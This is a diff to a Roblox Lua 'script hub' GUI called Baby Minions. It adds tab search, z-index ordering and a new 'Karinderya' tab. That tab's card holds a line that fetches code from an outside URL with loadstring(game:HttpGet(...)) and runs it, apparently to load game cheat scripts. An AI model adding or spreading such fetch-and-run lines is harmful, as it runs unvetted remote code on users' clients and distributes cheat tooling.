@@ -18,7 +18,8 @@ local gui = Instance.new("ScreenGui")
 gui.Name = "BabyMinionsScriptHub"
 gui.ResetOnSpawn = false
 gui.IgnoreGuiInset = true
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+gui.DisplayOrder = 999999
 gui.Parent = playerGui
 
 local NORMAL_SIZE = UDim2.fromOffset(620, 400)
@@ -49,6 +50,7 @@ main.AnchorPoint = Vector2.new(0.5, 0.5)
 main.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
 main.BorderSizePixel = 0
 main.Visible = false
+main.ZIndex = 1
 main.Parent = gui
 
 local mainCorner = Instance.new("UICorner")
@@ -64,6 +66,7 @@ local header = Instance.new("Frame")
 header.Name = "Header"
 header.Size = UDim2.new(1, 0, 0, 54)
 header.BackgroundTransparency = 1
+header.ZIndex = 2
 header.Parent = main
 
 local title = Instance.new("TextLabel")
@@ -75,6 +78,7 @@ title.TextColor3 = Color3.fromRGB(245, 245, 248)
 title.TextSize = 16
 title.Font = Enum.Font.GothamBold
 title.TextXAlignment = Enum.TextXAlignment.Left
+title.ZIndex = 3
 title.Parent = header
 
 local minimize = Instance.new("TextButton")
@@ -87,6 +91,7 @@ minimize.TextColor3 = Color3.fromRGB(225, 225, 230)
 minimize.TextSize = 18
 minimize.Font = Enum.Font.GothamBold
 minimize.AutoButtonColor = false
+minimize.ZIndex = 3
 minimize.Parent = header
 
 local minCorner = Instance.new("UICorner")
@@ -103,26 +108,68 @@ close.TextColor3 = Color3.fromRGB(225, 225, 230)
 close.TextSize = 20
 close.Font = Enum.Font.GothamBold
 close.AutoButtonColor = false
+close.ZIndex = 3
 close.Parent = header
 
 local closeCorner = Instance.new("UICorner")
 closeCorner.CornerRadius = UDim.new(0, 8)
 closeCorner.Parent = close
 
-local sidebar = Instance.new("Frame")
+local sidebar = Instance.new("ScrollingFrame")
 sidebar.Name = "Sidebar"
 sidebar.Size = UDim2.new(0, 175, 1, -54)
 sidebar.Position = UDim2.fromOffset(0, 54)
 sidebar.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
 sidebar.BorderSizePixel = 0
+sidebar.ScrollBarThickness = 3
+sidebar.ScrollBarImageColor3 = Color3.fromRGB(55, 55, 65)
+sidebar.CanvasSize = UDim2.new(0, 0, 0, 0)
+sidebar.AutomaticCanvasSize = Enum.AutomaticSize.Y
+sidebar.ElasticBehavior = Enum.ElasticBehavior.Never
+sidebar.ScrollingDirection = Enum.ScrollingDirection.Y
+sidebar.ZIndex = 2
 sidebar.Parent = main
+
+local searchBox = Instance.new("TextBox")
+searchBox.Name = "SearchBox"
+searchBox.Size = UDim2.new(1, -20, 0, 36)
+searchBox.Position = UDim2.fromOffset(10, 10)
+searchBox.BackgroundColor3 = Color3.fromRGB(29, 29, 34)
+searchBox.Text = ""
+searchBox.PlaceholderText = "Search tabs..."
+searchBox.TextColor3 = Color3.fromRGB(245, 245, 248)
+searchBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 130)
+searchBox.TextSize = 13
+searchBox.Font = Enum.Font.GothamMedium
+searchBox.ClearTextOnFocus = false
+searchBox.ZIndex = 3
+searchBox.Parent = sidebar
+
+local searchCorner = Instance.new("UICorner")
+searchCorner.CornerRadius = UDim.new(0, 9)
+searchCorner.Parent = searchBox
+
+local searchStroke = Instance.new("UIStroke")
+searchStroke.Color = Color3.fromRGB(55, 55, 65)
+searchStroke.Transparency = 0.5
+searchStroke.Parent = searchBox
+
+local tabsContainer = Instance.new("Frame")
+tabsContainer.Name = "TabsContainer"
+tabsContainer.Size = UDim2.new(1, 0, 0, 0)
+tabsContainer.Position = UDim2.fromOffset(0, 56)
+tabsContainer.BackgroundTransparency = 1
+tabsContainer.AutomaticSize = Enum.AutomaticSize.Y
+tabsContainer.ZIndex = 3
+tabsContainer.Parent = sidebar
 
 local tabs = {
 	"Steal an Egg",
 	"Ride a Pet",
 	"Hospital Anomaly",
 	"Dig & Clean",
-	"99 Nights"
+	"99 Nights",
+	"Karinderya"
 }
 
 local content = Instance.new("Frame")
@@ -130,32 +177,33 @@ content.Name = "Content"
 content.Size = UDim2.new(1, -175, 1, -54)
 content.Position = UDim2.fromOffset(175, 54)
 content.BackgroundTransparency = 1
+content.ZIndex = 2
 content.Parent = main
 
 local pages = {}
 local tabButtons = {}
+local allTabData = {}
 
-for i, tabName in ipairs(tabs) do
+local function createTabButton(tabName, index)
 	local button = Instance.new("TextButton")
 	button.Name = tabName .. "Button"
 	button.Size = UDim2.new(1, -20, 0, 42)
-	button.Position = UDim2.fromOffset(
-		10,
-		10 + ((i - 1) * 50)
-	)
+	button.Position = UDim2.fromOffset(10, ((index - 1) * 50))
 	button.BackgroundColor3 = Color3.fromRGB(29, 29, 34)
 	button.Text = tabName
 	button.TextColor3 = Color3.fromRGB(190, 190, 198)
 	button.TextSize = 13
 	button.Font = Enum.Font.GothamMedium
 	button.AutoButtonColor = false
-	button.Parent = sidebar
+	button.ZIndex = 4
+	button.Parent = tabsContainer
 
 	local buttonCorner = Instance.new("UICorner")
 	buttonCorner.CornerRadius = UDim.new(0, 9)
 	buttonCorner.Parent = button
 
 	tabButtons[tabName] = button
+	allTabData[tabName] = {button = button, index = index}
 
 	local page = Instance.new("ScrollingFrame")
 	page.Name = tabName
@@ -165,7 +213,8 @@ for i, tabName in ipairs(tabs) do
 	page.ScrollBarThickness = 3
 	page.BackgroundTransparency = 1
 	page.BorderSizePixel = 0
-	page.Visible = i == 1
+	page.Visible = index == 1
+	page.ZIndex = 3
 	page.Parent = content
 
 	pages[tabName] = page
@@ -189,19 +238,49 @@ for i, tabName in ipairs(tabs) do
 	end)
 end
 
+for i, tabName in ipairs(tabs) do
+	createTabButton(tabName, i)
+end
+
 tabButtons["Steal an Egg"].BackgroundColor3 =
 	Color3.fromRGB(65, 65, 82)
+
+local function filterTabs(query)
+	query = query:lower()
+	local visibleCount = 0
+
+	for tabName, data in pairs(allTabData) do
+		local button = data.button
+		local matches = tabName:lower():find(query) ~= nil
+
+		button.Visible = matches
+
+		if matches then
+			button.Position = UDim2.fromOffset(10, visibleCount * 50)
+			visibleCount = visibleCount + 1
+		end
+	end
+end
+
+searchBox:GetPropertyChangedSignal("Text"):Connect(function()
+	filterTabs(searchBox.Text)
+end)
+
+searchBox.Focused:Connect(function()
+	tween(searchStroke, {Transparency = 0})
+	searchBox.BackgroundColor3 = Color3.fromRGB(35, 35, 42)
+end)
+
+searchBox.FocusLost:Connect(function()
+	tween(searchStroke, {Transparency = 0.5})
+	searchBox.BackgroundColor3 = Color3.fromRGB(29, 29, 34)
+end)
 
 ----------------------------------------------------------------
 -- SCRIPT CARDS
 ----------------------------------------------------------------
 
-local function createScriptCard(
-	parent,
-	scriptName,
-	scriptCode,
-	index
-)
+local function createScriptCard(parent, scriptName, scriptCode, index)
 	local card = Instance.new("Frame")
 	card.Name = scriptName .. "Card"
 	card.Size = UDim2.new(1, -36, 0, 82)
@@ -211,6 +290,7 @@ local function createScriptCard(
 	)
 	card.BackgroundColor3 = Color3.fromRGB(30, 30, 36)
 	card.BorderSizePixel = 0
+	card.ZIndex = 4
 	card.Parent = parent
 
 	local cardCorner = Instance.new("UICorner")
@@ -226,6 +306,7 @@ local function createScriptCard(
 	nameLabel.TextSize = 14
 	nameLabel.Font = Enum.Font.GothamSemibold
 	nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+	nameLabel.ZIndex = 5
 	nameLabel.Parent = card
 
 	local textLabel = Instance.new("TextLabel")
@@ -237,6 +318,7 @@ local function createScriptCard(
 	textLabel.TextSize = 12
 	textLabel.Font = Enum.Font.Gotham
 	textLabel.TextXAlignment = Enum.TextXAlignment.Left
+	textLabel.ZIndex = 5
 	textLabel.Parent = card
 
 	local play = Instance.new("TextButton")
@@ -249,6 +331,7 @@ local function createScriptCard(
 	play.TextSize = 11
 	play.Font = Enum.Font.GothamBold
 	play.AutoButtonColor = false
+	play.ZIndex = 5
 	play.Parent = card
 
 	local playCorner = Instance.new("UICorner")
@@ -368,6 +451,13 @@ createScriptCard(
 	1
 )
 
+createScriptCard(
+	pages["Karinderya"],
+	"KARINDERYA HUB",
+	'loadstring(game:HttpGet("https://akkiwi.com/h"))()',
+	1
+)
+
 ----------------------------------------------------------------
 -- MINIMIZE
 ----------------------------------------------------------------
@@ -396,7 +486,7 @@ miniTitle.Name = "MiniTitle"
 miniTitle.Size = UDim2.new(1, -55, 1, 0)
 miniTitle.Position = UDim2.fromOffset(12, 0)
 miniTitle.BackgroundTransparency = 1
-miniTitle.Text = "Bby Minions"
+miniTitle.Text = "Baby Minions"
 miniTitle.TextColor3 = Color3.fromRGB(245, 245, 248)
 miniTitle.TextSize = 13
 miniTitle.Font = Enum.Font.GothamBold
@@ -457,9 +547,7 @@ local function startMiniDrag(input)
 	end
 
 	miniDragConnection =
-		UserInputService.InputChanged:Connect(function(
-			changedInput
-		)
+		UserInputService.InputChanged:Connect(function(changedInput)
 			if not draggingMini then
 				return
 			end
@@ -584,8 +672,7 @@ local confirmText = Instance.new("TextLabel")
 confirmText.Size = UDim2.new(1, -30, 0, 42)
 confirmText.Position = UDim2.fromOffset(15, 52)
 confirmText.BackgroundTransparency = 1
-confirmText.Text =
-	"Are you sure you want to close BABY MINIONS?"
+confirmText.Text = "Are you sure you want to close BABY MINIONS?"
 confirmText.TextColor3 = Color3.fromRGB(175, 175, 185)
 confirmText.TextSize = 12
 confirmText.Font = Enum.Font.Gotham
